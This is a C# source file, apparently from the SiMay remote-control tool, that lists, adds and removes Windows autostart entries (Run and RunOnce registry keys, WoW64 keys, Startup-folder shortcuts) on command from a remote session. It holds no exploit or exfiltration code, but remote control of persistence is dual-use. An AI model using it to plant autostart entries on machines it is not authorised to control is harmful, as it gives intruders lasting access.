using Microsoft.Win32;
using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using SiMay.Platform.Windows;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace SiMay.Service.Core
{
    [ServiceName("启动项管理")]
    [ApplicationServiceKey(ApplicationKeyConstant.REMOTE_STARTUP)]
    public class StartupService : ApplicationRemoteService
    {
        public override void SessionInited(SessionProviderContext session)
        {

        }

        public override void SessionClosed()
        {

        }

        [PacketHandler(MessageHead.S_STARTUP_GET_LIST)]
        public StartupPacket HandleGetStartupItems(SessionProviderContext session)
        {
            List<StartupItemPacket> startupItems = new List<StartupItemPacket>();

            using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
            {
                if (key != null)
                {
                    foreach (var item in key.GetKeyValues())
                    {
                        startupItems.Add(new StartupItemPacket
                        { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun });
                    }
                }
            }
            using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
            {
                if (key != null)
                {
                    foreach (var item in key.GetKeyValues())
                    {
                        startupItems.Add(new StartupItemPacket
                        { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce });
                    }
                }
            }
            using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
            {
                if (key != null)
                {
                    foreach (var item in key.GetKeyValues())
                    {
                        startupItems.Add(new StartupItemPacket
                        { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun });
                    }
                }
            }
            using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
            {
                if (key != null)
                {
                    foreach (var item in key.GetKeyValues())
                    {
                        startupItems.Add(new StartupItemPacket
                        { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce });
                    }
                }
            }
            if (PlatformHelper.Is64Bit)
            {
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItemPacket
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64Run });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new StartupItemPacket
                            {
                                Name = item.Item1,
                                Path = item.Item2,
                                Type = StartupType.LocalMachineWoW64RunOnce
                            });
                        }
                    }
                }
            }
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
            {
                var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                startupItems.AddRange(files.Where(file => file.Name != "desktop.ini")
                    .Select(file => new StartupItemPacket
                    {
                        Name = file.Name,
                        Path = file.FullName,
                        Type = StartupType.StartMenu
                    }));
            }

            return new StartupPacket()
            {
                StartupItems = startupItems.ToArray()
            };
        }
        [PacketHandler(MessageHead.S_STARTUP_ADD_ITEM)]
        public void HandleDoStartupItemAdd(SessionProviderContext session)
        {
            var command = session.GetMessageEntity<StartupItemPacket>();
            switch (command.Type)
            {
                case StartupType.LocalMachineRun:
                    if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                    {
                        throw new Exception("Could not add value");
                    }
                    break;
                case StartupType.LocalMachineRunOnce:
                    if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                    {
                        throw new Exception("Could not add value");
                    }
                    break;
                case StartupType.CurrentUserRun:
                    if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                    {
                        throw new Exception("Could not add value");
                    }
                    break;
                case StartupType.CurrentUserRunOnce:
                    if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                    {
                        throw new Exception("Could not add value");
                    }
                    break;
                case StartupType.LocalMachineWoW64Run:
                    if (!PlatformHelper.Is64Bit)
                        throw new NotSupportedException("Only on 64-bit systems supported");

                    if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                    {
                        throw new Exception("Could not add value");
                    }
                    break;
                case StartupType.LocalMachineWoW64RunOnce:
                    if (!PlatformHelper.Is64Bit)
                        throw new NotSupportedException("Only on 64-bit systems supported");

                    if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                    {
                        throw new Exception("Could not add value");
                    }
                    break;
                case StartupType.StartMenu:
                    if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                    {
                        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                    }

                    string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                        command.Name + ".url");

                    using (var writer = new StreamWriter(lnkPath, false))
                    {
                        writer.WriteLine("[InternetShortcut]");
                        writer.WriteLine("URL=file:///" + command.Path);
                        writer.WriteLine("IconIndex=0");
                        writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                        writer.Flush();
                    }
                    break;
            }
        }

        [PacketHandler(MessageHead.S_STARTUP_REMOVE_ITEM)]
        public void HandleDoStartupItemRemove(SessionProviderContext session)
        {
            var pack = session.GetMessageEntity<StartupPacket>();
            foreach (var command in pack.StartupItems)
            {
                switch (command.Type)
                {
                    case StartupType.LocalMachineRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.CurrentUserRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.CurrentUserRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineWoW64Run:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineWoW64RunOnce:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.StartMenu:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("File does not exist");

                        File.Delete(startupItemPath);
                        break;
                }
            }
        }
    }
}
